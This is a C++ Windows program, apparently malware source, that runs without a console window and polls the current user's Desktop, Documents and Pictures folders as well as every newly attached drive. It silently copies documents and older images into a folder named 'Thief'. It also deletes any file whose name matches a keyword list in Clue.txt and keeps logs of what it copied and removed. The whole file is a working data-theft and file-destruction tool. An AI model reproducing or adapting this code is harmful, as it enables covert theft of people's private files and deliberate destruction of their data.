
#include <iostream>
#include <queue>
#include "SimpleMap.h"
#include "AJ_Macro.h"
#include "AJ_Scanner.h"
#include "AJ_wText.h"
#include "AJ_System.h"
#include "AJ_FileSystem.h"
#include <io.h>
#include <fcntl.h>
#include "AJ_Thread.h"

using namespace AJimpa;

static std::queue<STRING> Q_Log;

void DebugMessage(std::wstring Message)
{
    std::wcout << L"=> " << Message << std::endl;
    Q_Log.push(Message + L" [" + GetCurrentDateW() + L" : " + GetTimeW() + L"]");
}

class CoreEngine
{
public:
    bool lifetime = true;
    std::queue<STRING> Q_Directories;          // Directory
    std::queue<STRING> Q_Files;                // File
    AJimpa::SimpleMap<STRING, bool> L_Drivers; // DriversList
    AJimpa::SimpleMap<STRING, int> L_Folder;   // FolderList
    std::vector<STRING> L_Files;               // FileList
    std::vector<std::string> L_Clue;
    STRING BasePath;
    std::string TargetDate;
    std::uintmax_t ImageValue = 0;

    CoreEngine()
    {
        DebugMessage(L"ApplicationStarted");

        AJ_Path ApplicationPath = splitPath(getApplicationPath());
        BasePath = ApplicationPath.Parentpath + L"\\" + GetSystemUsernameW() + L"\\";
        CreateDirectoryw(ApplicationPath.Parentpath + L"\\" + GetSystemUsernameW());
        CreateDirectoryw(ApplicationPath.Parentpath + L"\\" + GetSystemUsernameW() + L"\\Thief");

        DebugMessage(L"SetupFolder With This System: -->" + GetSystemUsernameW());

        L_Drivers.insert((L"C:\\Users\\" + GetSystemUsernameW() + L"\\Desktop\\"), false);
        L_Drivers.insert((L"C:\\Users\\" + GetSystemUsernameW() + L"\\Documents\\"), false);
        L_Drivers.insert((L"C:\\Users\\" + GetSystemUsernameW() + L"\\Pictures\\"), false);

        DebugMessage(L"Add New Path --> Desktop|Documents|Pictures");

        if (CanRemove())
        {
            // Set the locale to handle wide characters in console input/output
            std::locale::global(std::locale("en_US.UTF-8"));
            // Set the console output code page to UTF-8
            SetConsoleOutputCP(CP_UTF8);
            ScanesFile(L"Clue.txt", L_Clue);
            TargetDate = L_Clue[0];

            DebugMessage(L"Find Clue List & Date Limitation");
        }
    };
    ~CoreEngine()
    {
        DebugMessage(L"ApplicationEnded");
    };

    bool CanRemove()
    {
        return IsFileExists(wstringToString(splitPath(getApplicationPath()).Parentpath) + "\\Clue.txt");
    }

    void Cleanup()
    {
        clearQueue(Q_Directories);
        clearQueue(Q_Files);
        L_Folder.clear();
        L_Files.clear();
        DebugMessage(L"Memory Clear");
    }

    void clearQueue(std::queue<STRING> &q)
    {
        std::queue<STRING> empty;
        std::swap(q, empty);
        ImageValue = 0;
    }

    bool IsFreeSize()
    {
        if (ImageValue < 268435456)
        {
            return true;
        }
        else
        {
            return false;
        }
    }

};

bool ForceExit()
{
    return IsFileExists(wstringToString(splitPath(getApplicationPath()).Parentpath) + "\\STOP.txt");
}

void E_Remove(CoreEngine &Hub_ref, wTextFile &History, STRING Filepath)
{
    if (Hub_ref.L_Clue.size() > 0)
    {
        AJ_Path target = splitPath(Filepath);
        if (findMatches(Hub_ref.L_Clue, wstringToString(target.Filename)))
        {
            History.WriteLine(Filepath);
            RemoveFile(wstringToString(Filepath));
        }
    }
}

void E_Copy(CoreEngine &Hub_ref,wTextFile &History, STRING Pathfile)
{
    AJ_Path Cfile = splitPath(Pathfile);

    if ( !containsFolder(Pathfile, L"$RECYCLE.BIN") && !containsFolder(Pathfile, L"HTJ") )
    {
        if (Cfile.Filetype == L".txt" || Cfile.Filetype == L".pdf" || Cfile.Filetype == L".docx" || Cfile.Filetype == L".docm" || Cfile.Filetype == L".dotx")
        {
            copyFileToFolder(Pathfile, (Hub_ref.BasePath + L"Thief"));
            History.WriteLine(Pathfile);
        }

        auto targetDate = stringToTimePoint(Hub_ref.TargetDate);
        if (Hub_ref.IsFreeSize() && isFileBeforeDate(Pathfile, targetDate))
        {
            if (Cfile.Filetype == L".png" || Cfile.Filetype == L".jpg")
            {
                copyFileToFolder(Pathfile, (Hub_ref.BasePath + L"Thief"));
                History.WriteLine(Pathfile);
                Hub_ref.ImageValue += getFileSize(Pathfile);
                LOG(Hub_ref.ImageValue);
            }
        }
    }
}

void E_Revenge(CoreEngine &Hub_ref)
{
    if (!Hub_ref.Q_Files.empty())
    {
        wTextFile Myfile(Hub_ref.BasePath + GetCurrentDateW() + GetTimeW() + L".rtf");
        DebugMessage(L"CreateTextFile");

        wTextFile RemovelistF(Hub_ref.BasePath + L"RemoveList.rtf");
        wTextFile CopylistF(Hub_ref.BasePath + L"CopyList.rtf");

        while (!Hub_ref.Q_Files.empty())
        {
            STRING path = Hub_ref.Q_Files.front();
            // Copy
            E_Copy(Hub_ref,CopylistF, path);
            // Archive
            Hub_ref.L_Files.push_back(path);
            // Write
            Myfile.WriteLine(path);
            // Detect for Removing
            E_Remove(Hub_ref, RemovelistF, path);
            Hub_ref.Q_Files.pop();
        }
        Myfile.Flush();
        DebugMessage(L"WriteFiles: -->" + std::to_wstring(Hub_ref.L_Files.size()));
    }
}

void E_LOGSystem(CoreEngine &Hub_ref)
{
    wTextFile LogFile(Hub_ref.BasePath + L"Log.rtf");
    while (!Q_Log.empty())
    {
        STRING logmessage = Q_Log.front();
        LogFile.WriteLine(logmessage);
        Q_Log.pop();
    }
    LogFile.Flush();
}

void E_Scanner(CoreEngine &Hub_ref, STRING TargetPath)
{
    listDirectories(TargetPath, &Hub_ref.Q_Directories);
    while (!Hub_ref.Q_Directories.empty())
    {
        // LOG(Hub_ref.Q_Directories.size());
        std::wstring targetfolder = (Hub_ref.Q_Directories.front() + stringToWString("\\"));
        int filecount = Hub_ref.Q_Files.size();
        listFiles(targetfolder, &Hub_ref.Q_Files);
        filecount = Hub_ref.Q_Files.size() - filecount;
        Hub_ref.L_Folder.insert(targetfolder, filecount);
        listDirectories(targetfolder, &Hub_ref.Q_Directories);
        Hub_ref.Q_Directories.pop();
    }

    DebugMessage(TargetPath + L": -->" + std::to_wstring(Hub_ref.Q_Files.size()));
}

// Entry point for a Windows application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Mark parameters as unused to suppress warnings
    (void)hInstance;
    (void)hPrevInstance;
    (void)lpCmdLine;
    (void)nCmdShow;

    CoreEngine Hub = CoreEngine();

    //_setmode(_fileno(stdout), _O_U16TEXT);

    while (Hub.lifetime)
    {
        using namespace std::literals::chrono_literals;
        std::this_thread::sleep_for(5s);

        for (auto Target : Hub.L_Drivers.map())
        {
            if (!Target.second && Target.first != L"C:\\")
            {
                DebugMessage(L"  ---[" + Target.first + L"]--- ");

                Hub.L_Drivers.insert(Target.first, true);
                E_Scanner(Hub,Target.first);
                E_Revenge(Hub);
                E_LOGSystem(Hub);
                Hub.Cleanup();
            }
        }

        for (STRING MyDrive : GetListLogicalDrivew())
        {
            if (!Hub.L_Drivers.find(MyDrive))
            {
                Hub.L_Drivers.insert(MyDrive, false);
                DebugMessage(L"Add New Path --> " + MyDrive);
            }
        }

        if (ForceExit())
        {
            Hub.lifetime = false;
        }
        
    }

    DebugMessage(L"Application exiting...");
    return 0;
}
